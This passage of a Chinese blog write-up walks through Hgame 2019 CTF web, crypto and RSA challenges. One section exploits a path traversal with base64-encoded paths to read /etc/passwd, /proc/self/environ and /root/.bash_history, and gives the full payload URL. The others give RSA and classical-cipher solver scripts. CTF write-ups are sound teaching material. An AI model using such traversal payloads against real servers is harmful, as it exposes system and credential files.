class="string">"hgame"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(r.text)</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><a href="https://imgchr.com/i/kHVkA1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/28/kHVkA1.md.png" alt="kHVkA1.md.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;9242455136c7afcc0d75204281e558ab63ac9a841e514a37e6702f15f21f3e01&#125;</span><br></pre></td></tr></table></figure><p><strong>这题出的真的是好，花了很长时间才解出来，归纳一下：</strong></p><ol><li><strong>还是不要只刷CTF题忘记原理的理解，类似于UA头，referer，此类的反爬虫措施还是很常见的，还有就是实际爬虫不注意说不定会被反日…</strong></li><li><strong>两个trick分别是对应了猫眼电影和汽车之家的前端反爬机制，利用视觉差异来欺骗爬虫而不影响正常的用户，如果不加注意，那么爬到的数据有可能就是一堆毫无作用的数据；</strong></li></ol><h3 id="Math有趣"><a href="#Math有趣" class="headerlink" title="Math有趣"></a>Math有趣</h3><p>通过第一关以后发现第二关的题目是一张图片，查看图片地址发现地址为：<code>cXVlc3Rpb24ucG5n.php</code>，base64解码以后发现为<code>question.png</code>，想到任意文件读取漏洞，尝试<code>../../../../../etc/passwd.php</code>（base64以后），发现可以成功读取：</p><p><a href="https://imgchr.com/i/kH53Xd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kH53Xd.md.png" alt="kH53Xd.md.png"></a></p><p><strong><em>hint：了解一下tomcat、spring mvc的目录结构和配置文件(自己搭一下就明白了</em></strong></p><p><strong>solution1：</strong>既然可以读取，于是尝试<code>../../../../../proc/self/environ</code>，成功读取，下载下来16进制转码得到有用的路径：</p><p><a href="https://imgchr.com/i/kHIVgg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHIVgg.md.png" alt="kHIVgg.md.png"></a></p><p><strong>solution2：</strong>还有一种方法就是读取<code>/root/.bash_history</code>查看命令历史：</p><p>进入tomcat：</p><p><img src="https://s2.ax1x.com/2019/03/01/kHIzGT.png" alt="kHIzGT.png"></p><p>工作目录：</p><p><img src="https://s2.ax1x.com/2019/03/01/kHIOZn.png" alt="kHIOZn.png"></p><p>到现在为止定位到：<code>usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller</code></p><p>试一下随便读取<code>1.php</code>，发现报错，发现了关键信息:</p><p><a href="https://imgchr.com/i/kHo1eA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHo1eA.md.png" alt="kHo1eA.md.png"></a></p><p>所以读取路径最后为：<code>../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class</code></p><p><strong>payload:</strong><code>http://test.tan90.me:8080/img/Li4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL3RvbWNhdC93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2hnYW1lL2NvbnRyb2xsZXIvTWF0aENvbnRyb2xsZXIuY2xhc3M=</code></p><p>读取到改为后缀为class文件以后，进行反编译为java文件，得到源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hgame.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.ModelMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@org</span>.springframework.stereotype.Controller</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MathController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MathController</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/index"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(ModelMap model, HttpSession session, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Object step = session.getAttribute(<span class="string">"step"</span>);</span><br><span class="line">    <span class="keyword">if</span> (step == <span class="keyword">null</span>) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, Character.valueOf(<span class="string">'1'</span>));</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (step.toString().equals(<span class="string">"1"</span>)) &#123;</span><br><span class="line">      model.addAttribute(<span class="string">"message"</span>, <span class="string">"Welcome to the world of mathematics.&lt;br/&gt;Let's warm up first.&lt;br/&gt;1+1=?"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (step.toString().equals(<span class="string">"2"</span>)) &#123;</span><br><span class="line">      model.addAttribute(<span class="string">"message"</span>, <span class="string">"It seems that you have learned it, let us do a difficult question.&lt;br/&gt;&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;&lt;br/&gt;Show me the smallest integer solutions."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"math"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/index"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pindex</span><span class="params">(@org.springframework.web.bind.annotation.RequestParam(<span class="string">"answer"</span>)</span> String answer, HttpSession session, HttpServletResponse response) <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Object step = session.getAttribute(<span class="string">"step"</span>);</span><br><span class="line">    <span class="keyword">if</span> (step == <span class="keyword">null</span>) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, Character.valueOf(<span class="string">'1'</span>));</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((step.toString().equals(<span class="string">"1"</span>)) &amp;&amp; </span><br><span class="line">      (answer.equals(<span class="string">"2"</span>))) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, <span class="string">"2"</span>);</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/img/&#123;path&#125;"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">image</span><span class="params">(@org.springframework.web.bind.annotation.PathVariable(<span class="string">"path"</span>)</span> String path, HttpServletResponse response)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    path = <span class="keyword">new</span> String(java.util.Base64.getDecoder().decode(path));</span><br><span class="line">    InputStream f = <span class="keyword">null</span>;</span><br><span class="line">    OutputStream out = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f = <span class="keyword">new</span> java.io.FileInputStream(<span class="string">"/home/static/"</span> + path);</span><br><span class="line">      out = response.getOutputStream();</span><br><span class="line">      <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="string">' '</span>];</span><br><span class="line">      <span class="keyword">while</span> ((count = f.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        out.write(buffer, <span class="number">0</span>, count);</span><br><span class="line">        out.flush();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f.close();</span><br><span class="line">      out.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ok"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/flag"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现关键函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>123852^x % 612799081 = 6181254136845 % 612799081</code>， <code>^</code>为乘方，这是又考察我数论的知识啊…一想到信安数学基础就头皮发麻…直接爆破吧，就是要耗时长一点：<br>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> pow(<span class="number">123852</span>,i,<span class="number">612799081</span>) == (<span class="number">6181254136845</span> % <span class="number">612799081</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="https://s2.ax1x.com/2019/03/01/kHbCfx.png" alt="kHbCfx.png"></p><p><strong><em>java在线反编译链接：<a href="http://www.javadecompilers.com" target="_blank" rel="noopener">http://www.javadecompilers.com</a></em></strong></p><h2 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="浪漫足球圣地"><a href="#浪漫足球圣地" class="headerlink" title="浪漫足球圣地"></a>浪漫足球圣地</h3><p>百度一下浪漫足球圣地，得到是曼彻斯特，也就是暗示为曼彻斯特编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559</span><br></pre></td></tr></table></figure><p>先转换为2进制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>按照<a href="https://www.ezloo.com/2008/05/manchester_encoding.html" target="_blank" rel="noopener">曼彻斯特编码标准</a>进行转码：<code>&#39;10&#39;-&gt;&#39;0&#39;       &#39;01&#39;-&gt;&#39;1&#39;</code>替换以后正常解码即可；</p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">s=<span class="string">"966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559"</span></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res+=<span class="string">'&#123;:04b&#125;'</span>.format(int(i,<span class="number">16</span>))</span><br><span class="line"><span class="comment"># print res</span></span><br><span class="line">fin=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(res),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> res[j:j+<span class="number">2</span>]==<span class="string">'10'</span>:</span><br><span class="line">        fin+=<span class="string">'0'</span></span><br><span class="line">    <span class="keyword">elif</span> res[j:j+<span class="number">2</span>]==<span class="string">'01'</span>:</span><br><span class="line">        fin+=<span class="string">'1'</span></span><br><span class="line"><span class="comment"># print fin</span></span><br><span class="line">flag=int(fin,<span class="number">2</span>)</span><br><span class="line"><span class="comment"># print flag</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&#123;:x&#125;'</span>.format(flag).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3f24e567591e9cbab2a7d2f1f748a1d4&#125;</span><br></pre></td></tr></table></figure><h3 id="hill"><a href="#hill" class="headerlink" title="hill"></a>hill</h3><blockquote><p>Description<br>hill密码，秘钥是3x3矩阵，flag的密文是TCSHXZTCXAPBDKJVJDOHJEAE，flag中含有BABYSHILL，flag是有意义的英文，最终提交格式: hgame{有意义的英文} hint1: <a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Hill_cipher</a> hint2: 模逆元</p></blockquote><p>未完待续……</p><h3 id="Vigener"><a href="#Vigener" class="headerlink" title="Vigener~"></a>Vigener~</h3><blockquote><p>cipher:<br>Zbi Namyrwjk wmhzk cw s eknlgv uz ifuxstlata edhnufwlow xwpz vc mkohk s kklmwk uz mflklagnkh Gswyuv uavbijk, huwwv uh xzw ryxlwxm sx s qycogxx. Ml ay u jgjs ij hgrsedhnufwlow wmtynmlmzcsf. Lny gahnyv ak kuwq lu orvwxmxsfj urv asjpwekhx, tmz cx jwycwlwj upd szniehzm xg txyec az zsj lnliw ukhxmjoyw, ozowl wsxhiv az nlw vkmgjavnmgf ry gzalzvw atxiuzozjjshfi. Ests twgvfi zsby xjakx xg asjpwekhx wfilchloir kunyqwk zbel sxy ikkkhxasrfc Namyrwjk wmhzklw. Af kckzlkyr kadnc lzxyi, Xjoyhjaib Oskomoa ogm xzw lcvkl zi tmtrcwz s myrwjgf qwlnih gx jygahnyvafm Pmywtyvw uojlwjy. Nlw Noaifwxy gahnyv osy ivayohedde xikuxcfwv hs Kagbur Tsznmklg Viddgms af ncw gfk nlgmyurv xopi zmtxvwv ghh xalnc-gfk vsgc Ru gaxxu hwd. Yck. Yaupef Tgnxakzu Fwdruwg, tan xzw ywlwek qek dgnij eomellxcfmlkx xg Trumkw jy Zaykhijw oh xzw tcrwln wiflalc sfj ms suwomjwj cxk hxywwfz heew. lfey ay ajqmenycpglmqqjzndhrqwpvhtaniz</p><p>key: guess</p></blockquote><p>在线解密即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The Vigenere ciphe is a method of encrypting alphabetic text by using a series of interwoven Caesar ciphers, based on the letters of a keyword. It is a form of polyalphabetic substitution. The cipher is easy to understand and implement, but it resisted all attempts to break it for three centuries, which earned it the description le chiffre indechiffrable. Many people have tried to implement encryption schemes that are essentially Vigenere ciphers. In eighteen sixty three, Friedrich Kasiski was the first to publish a general method of deciphering Vigenere ciphers. The Vigenere cipher was originally described by Giovan Battista Bellaso in his one thousand five hundred and fifty-one book La cifra del. Sig. Giovan Battista Bellaso, but the scheme was later misattributed to Blaise de Vigenere in the nineth century and so acquired its present name. flag is gfyuytukxariyydfjlplwsxdbzwvqt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;gfyuytukxariyydfjlplwsxdbzwvqt&#125;</span><br></pre></td></tr></table></figure><h1 id="Hgame-2019几道有趣的RSA"><a href="#Hgame-2019几道有趣的RSA" class="headerlink" title="Hgame-2019几道有趣的RSA"></a>Hgame-2019几道有趣的RSA</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><blockquote><p>e = 12<br>p = 58380004430307803367806996460773123603790305789098384488952056206615768274527<br>q = 81859526975720060649380098193671612801200505029127076539457680155487669622867<br>ciphertext = 206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460<br>算出的m转化成字符串</p></blockquote><p>说实话这题本来以为很简单的，想直接求私钥，直接求解，没想到算出来φ(n)和e=12不互素，无法求出e对应的公钥，所以直接解是没有办法的；</p><p>解法如下：</p><p><a href="https://imgchr.com/i/kquFSI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/02/kquFSI.md.jpg" alt="kquFSI.md.jpg"></a></p><p>解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">e = <span class="number">12</span></span><br><span class="line">p = <span class="number">58380004430307803367806996460773123603790305789098384488952056206615768274527</span></span><br><span class="line">q = <span class="number">81859526975720060649380098193671612801200505029127076539457680155487669622867</span></span><br><span class="line">ciphertext = <span class="number">206087215323690202467878926681944491769659156726458690815919286163630886447291570510196171585626143608988384615185921752409380788006476576337410136447460</span></span><br><span class="line">n=p*q</span><br><span class="line">ol=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">3</span>,ol)</span><br><span class="line">ciphertext1=pow(ciphertext,d,n)</span><br><span class="line">ans=rabin_decrypt(ciphertext1,p,q,e=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">temp=rabin_decrypt(i,p,q,e=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> temp:</span><br><span class="line">flag=<span class="string">'&#123;:x&#125;'</span>.format(x).decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> flag:</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h2><blockquote><p>m为17位十进制数，提交格式hgame{m}</p><p>e1:0x33240</p><p>e2:0x3e4f</p><p>n:0x9439682bf1b4ab48c43c524778c579cc844b60872275725c1dc893b5bcb358b9f136e4dab2a06318bb0c80e202a14bc54ea334519bec023934e01e9378abf329893f3870979e9f2f2be8fff4df931216a77007a2509f49f697bf286285e97fac5dc6e4a164b5c2cc430887b18136437ba67777bda05aafdeaf918221c812b4c7d1665238f84ab0fab7a77fcae92a0596e58343be7a8e6e75a5017c63a67eb11964970659cd6110e9ec6502288e9e443d86229ef2364dfecb63e2d90993a75356854eb874797340eece1b19974e86bee07019610467d44ec595e04af02b574a97fa98bdb2e779871c804219cab715f4a80fef7f8fb52251d86077560b39c1c2a1</p><p>c1:0x7c7f315a3ebbe305c1ad8bd2f73b1bb8e300912b6b8ba1b331ac2419d3da5a9a605fd62915c11f8921c450525d2efda7d48f1e503041498f4f0676760b43c770ff2968bd942c7ef95e401dd7facbd4e5404a0ed3ad96ae505f87c4e12439a2da636f047d84b1256c0e363f63373732cbaf24bda22d931d001dcca124f5a19f9e28608ebd90161e728b782eb67deeba4cc81b6df4e7ee29a156f51a0e5148618c6e81c31a91036c982debd1897e6f3c1e5e248789c933a4bf30d0721a18ab8708d827858b77c1a020764550a7fe2ebd48b6848d9c4d211fd853b7a02a859fa0c72160675d832c94e0e43355363a2166b3d41b8137100c18841e34ff52786867d</p><p>c2:0xf3a8b9b739196ba270c8896bd3806e9907fca2592d28385ef24afadc2a408b7942214dad5b9e14808ab988fb15fbd93e725edcc0509ab0dd1656557019ae93c38031d2a7c84895ee3da1150eda04cd2815ee3debaa7c2651b62639f785f6cabf83f93bf3cce7778ab369631ea6145438c3cd4d93d6f2759be3cc187651a33b3cc4c3b477604477143c32dfff62461fdfd9f8aa879257489bbf977417ce0fbe89e3f2464475624aafef57dd9ea60339793c69b53ca71d745d626f45e6a7beb9fcbd9d1a259433d36139345b7bb4f392e78f1b5be0d2c56ad50767ee851fac670946356b3c05d0605bf243b89c7e683cc75030b71633632fb95c84075201352d6</p><p>c1=pow(m, e1, n)<br>c2=pow(m, e2, n)</p></blockquote><p>先转化为10进制，发现e1=209472，e2=15951，e1,e2不互素，最大公因数为3；本想用共模攻击，但是e1和e2不互素，没办法达到共模攻击的条件，但是仔细推来发现：</p><blockquote><p>gcd(e1,e2)=3，则gcd(e1/3,e2/3)=1</p><p>所以令a1=e1/3,a2=e2/3，则gcd(a1,a2)=1</p><p>所以存在r*a1+s*a2=1，所以r*e1+s*e2=3 (扩展欧几里得算法)</p><p>则(c1^r)*(c2^s)=(m^(r*e1))<em>(m^(s\</em>e2))=m^(r*e1+s*e2)=m^3 //共模攻击</p><p>所以到此为止：(m^3) mod n=(c1^r)*(c2^s) mod n 为已知数</p><p>所以直接低指数攻击即可</p></blockquote><p>上解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">same_attack</span><span class="params">(e1,e2,mess1,mess2,n)</span>:</span></span><br><span class="line">gcd,s,t=gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="keyword">if</span> s&lt;<span class="number">0</span>:</span><br><span class="line">s=-s</span><br><span class="line">mess1=gmpy2.invert(mess1,n)</span><br><span class="line"><span class="keyword">if</span> t&lt;<span class="number">0</span>:</span><br><span class="line">t=-t</span><br><span class="line">mess2=gmpy2.invert(mess2,n)</span><br><span class="line">mess=gmpy2.powmod(mess1,s,n)*gmpy2.powmod(mess2,t,n)%n</span><br><span class="line"><span class="keyword">return</span> mess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_attack</span><span class="params">(c,n,e)</span>:</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, e)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        x = gmpy2.iroot(c+i*n, e)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> x</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">e1=<span class="string">"0x33240"</span></span><br><span class="line">e2=<span class="string">"0x3e4f"</span></span><br><span class="line">n=<span 